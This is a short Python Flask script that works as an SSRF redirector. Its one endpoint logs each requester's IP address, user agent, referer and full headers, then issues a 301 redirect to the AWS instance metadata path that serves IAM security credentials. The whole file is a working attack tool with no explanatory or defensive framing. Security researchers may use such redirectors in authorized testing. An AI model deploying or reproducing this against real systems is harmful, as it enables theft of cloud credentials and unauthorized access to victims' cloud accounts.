from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/ssrf-redirect")
def ssrf_redirect():
    # get real IP through Render's proxy
    real_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "none")
    referer = request.headers.get("Referer", "-")
    
    print(f"[+] Real IP: {real_ip}")
    print(f"[+] User-Agent: {ua}")
    print(f"[+] Referer: {referer}")
    print(f"[+] All headers: {dict(request.headers)}")
    
    return redirect(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        code=301
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
